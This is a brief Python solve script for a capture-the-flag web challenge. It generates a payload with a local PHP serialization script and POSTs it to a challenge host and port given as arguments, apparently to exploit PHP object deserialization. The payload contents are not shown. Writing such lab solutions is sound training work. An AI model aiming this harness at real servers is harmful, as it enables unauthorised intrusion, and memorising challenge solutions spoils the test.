#!/usr/bin/python3

#|###############################|#
#| Chronos Security | Marin Radu |#
#| https://chronossec.site       |#
#| https://github.com/ChronosPK  |#
#|###############################|#

import requests
import sys
import subprocess

# python3 solve.py chal.chronossec.site 30230

domain = str(sys.argv[1])
port = int(sys.argv[2])
url = f'http://{domain}:{port}'

payload = subprocess.run(['php', 'create/serialize.php'], capture_output=True, text=True).stdout
print(payload)

data = payload.encode('utf-8')
response = requests.post(url, data=data)

print(response.text)
